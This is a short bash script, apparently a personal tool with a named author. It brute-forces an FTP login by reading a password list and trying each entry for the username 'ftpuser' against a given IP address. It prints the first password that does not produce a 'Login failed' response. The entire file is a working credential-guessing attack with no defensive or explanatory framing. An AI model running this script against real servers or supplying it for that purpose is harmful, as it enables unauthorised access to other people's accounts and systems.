#!/bin/bash
# Author: Ismail Rageh
# Usage ./brute.sh {IP} {Path/to/passwordlist}


cat $2 | while read line
do
	status=$(echo "user ftpuser $line" | /usr/bin/ftp -n $1)
	if [[ $status  != *"Login failed"* ]]; then 
		echo "USERNAME ftpuser PASSWORD $line" 
	     	break
	fi
	
done

